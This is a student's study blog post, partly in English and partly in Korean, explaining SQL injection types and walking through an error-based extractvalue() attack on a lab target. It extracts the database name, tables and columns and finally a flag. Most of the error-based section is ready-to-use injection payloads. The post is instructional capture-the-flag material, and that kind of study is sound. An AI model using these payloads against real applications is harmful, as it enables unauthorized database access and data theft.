---
title: "Week 7 - Error-based / Blind SQL Injection"
date: 2025-06-03
categories: [study]
layout: single
author_profile: true
sidebar:
  nav: "main"
read_time: true
toc: true
toc_label: "On this page"
toc_sticky: true
---

## 1. Types of SQL Injection (Union-based, Error-based, Blind)

SQL Injection techniques can generally be categorized into the following three types:

**Union-based SQL Injection**

**Error-based SQL Injection**

**Blind SQL Injection**

### (1) Union-based SQL Injection
Condition: The result of the SQL query is directly displayed on the page.
purpose: Use **UNION SELECT** to append custom queries and extract data by injecting into the output.

``` 
UNION SELECT 1,2,3,4 #
```

→ it is important to match the number of columns 
→ You can insert values into visible columns to leak data

### (2) Error-based SQL Injection

Condition: The server displays detailed SQL error messages.
Goal: Trigger an error that includes the result of a **SELECT** query within the error message itself.

Syntax errors are usually not helpful
Logic errors are more effective for exposing data in the error

Recommended function: __extractvalue()__

``` 
extractvalue('1', concat(0x3a, (select 'normaltic')))
``` 
Attack Format:

``` 
' AND extractvalue('1', concat(0x3a, (SQL))) AND '1'='1
``` 
Typical Steps:

Get the database name
→ SELECT database()

Get table names
→ SELECT table_name FROM information_schema.tables WHERE table_schema='segfault_sql' LIMIT 0,1

Get column names
→ SELECT column_name FROM information_schema.columns WHERE table_name='game' LIMIT 0,1

### (3) Blind SQL Injection

Condition: No data is printed, and no error messages are shown (the response differs only by true/false conditions).

Goal: Extract data by asking true/false questions and observing changes in the server's response.

Basic Format:

``` 
' AND (condition) AND '1'='1
```

Example:

``` 
' AND substr((select 'test'), 1,1) = 't' AND '1'='1
```

Useful Functions:
- substr(string, position, length) → Extract part of a string
- ascii(char) → Get ASCII code of a character
- SELECT database() → Get current database name

## 2. Error Based Injection 
To use error-based SQL injection, we first need to trigger a logical error in the backend.

Before that, let’s understand the difference between syntax errors and logical errors.

- Syntax Error
: Occurs when a query violates SQL grammar rules.
For example: **select * from games where name = '$over**
This query is missing a closing quote ('), which makes it invalid SQL and prevents execution.
![image](https://github.com/user-attachments/assets/f9baa0b9-ed34-4a93-9807-da3a30000905)

- Logical Error
: Occurs when the query is syntactically valid, but the logic or intended behavior is broken.
For example: **SELECT * FROM users WHERE username = '$user' OR 1=1;**
The query is technically correct, but OR 1=1 always returns true, causing the database to return all users, which defeats the intended purpose.


Just like UNION-based injection, error-based injection can also be broken down into a 7-step process to extract data.

![image](https://github.com/user-attachments/assets/de405a18-815a-4e39-9cbd-e5a321a39509)

### Step 1. Find the Injection Point
You can identify whether your input is injected into the SQL query by trying a single quote **'** and observing how the server reacts.
 
### Step 2. Choose a Function that Outputs an Error
In this case, we’ll use the extractvalue(xml, xpath_expr) function.
extractvalue() function:
- First argument: XML string
- Second argument: XPath expression (used to extract a value from the XML)
Example XML:
``` 
<user>
  <name>Jimin</name>
</user>
```
Query:
```
extractvalue(xml_string, '/user/name')
-- Returns: Jimin
```

However, instead of using it correctly, we’ll use it **incorrectly** on purpose to force an error message. If the website is configured to show SQL error messages, we can inject our desired value into the error message itself..

How to Trigger the Error?
We intentionally pass a malformed XPath expression as the second argument:

``` 
extractvalue('1', ':abc')
```

Since **:abc** is not valid XPath, this triggers -> **XPATH syntax error: ':abc'** 
Now, we can replace abc with any value we want to extract — and it will be revealed inside the error message.

### Step 3. Create the Injection Format
Initially, you might think the following works: normaltic' AND extractvalue('1', (SELECT '____')) AND '1'='1
But this doesn't actually cause an error — XPath must be malformed.

You might then try: normaltic' AND extractvalue('1', :(SELECT 'value')) AND '1'='1

But this results in SQL syntax error due to the : operator, which is invalid in MySQL.

✅ Correct approach is to use concat() to merge values and trigger a parsing error inside XPath:



"abc"자리에 우리가 원하는 값을 가져오기 위해서는 select문을 넣어줘야할것이다 select문을 넣으면 공격문은 
normaltic' and extractvalue('1', (SELECT '여기에 데이터 뽑기 쿼리 넣기'))) AND '1'='1
이렇게 생각할 수 있다. 하지만 저렇게 select문을 집어넣으면 xpath에 오류가 발생하지않는다 위처럼 ':을 삽입시켜 xpath에 오류를 발생시켜야한다
normaltic' and extractvalue('1', :(SELECT '여기에 데이터 뽑기 쿼리 넣기'))) AND '1'='1
하지만 위처럼 단순히 : 를 삽입하는것은 sql 문법 자체가 잘못된것이기떄문에 쿼리 자체가 실행이 되지 않는다. 즉 에러 메세지에 아무것도 뜨지 않게 된다.
때문에 **concat()**을 이용해 문자열 결합 후 XPath로 넘긴다면 파싱 에러를 발생시킬 수 있다.

참고로 끝에 [AND '1'='1] 이 추가되는 이유는 마지막에 붙는 싱글쿼터가 오류를 발생시키지 않도록 즉 문법 에러를 막기위해 항등식을 이용하는것이다. 
``` 
최종 공격 구문:
normaltic' and extractvalue('1', concat(0x3a, (select 'test'))) and '1'='1
normaltic' and extractvalue('1', concat(0x3a, (select '_______'))) and '1'='1
``` 
![image](https://github.com/user-attachments/assets/25b10693-e16c-4f79-b697-8ac89e013d5f)

step 4. DB이름 탈취
공격 구문이 완성되었으니 우리가 원하는 데이터를 뽑아오는것이 가능하다.
``` 
normaltic' and extractvalue('1', concat(0x3a, (select database()))) and '1'='1
``` 
![image](https://github.com/user-attachments/assets/18c23230-20ed-42bf-a699-6736a8c75a03)

step 5. 테이블 이름 탈취
union injection과 동일하게 information_schema.tables에서 뽑아올 수 있다.
``` 
normaltic' and extractvalue(1, concat(0x3a, (select table_name from information_schema.tables where table_schema='errSqli'))) and '1'='1
```
![image](https://github.com/user-attachments/assets/a702e4ec-23fd-4876-ad94-fbee5656a26e)
	서브쿼리에서 여러 행이 반환되어 오류가 발생했다. limit를 사용해 한번에 하나의 row만 반환할 수 있도록 만들자

``` 
normaltic' and extractvalue(1, concat(0x3a, (select table_name from information_schema.tables where table_schema='errSqli' limit 0,1))) and '1'='1
```
![image](https://github.com/user-attachments/assets/077d5b9c-3713-4d6d-b4ce-587946b52473)

step 6. 컬럼 이름 탈취
information_schema.columns를 이용한다 방식은 동일하다

``` 
normaltic' and extractvalue(1, concat(0x3a, ( select column_name from information_schema.columns where table_name='flagTable'limit 0,1))) and '1'='1
``` 
![image](https://github.com/user-attachments/assets/f54dedaa-f141-4f6b-8a30-cccb7e6ac021)
![image](https://github.com/user-attachments/assets/d48916ca-a473-4eb8-8991-9fbb77e5cdac)

step 7. 데이터를 추출
flag컬럼에 있는 데이터를 추출해보자
```
normaltic' and extractvalue(1, concat(0x3a, (select flag from flagTable limit 0,1))) and '1'='1
``` 
![image](https://github.com/user-attachments/assets/f2df5eb6-8462-423d-b599-3c404674abc4)

flag를 발견했다.






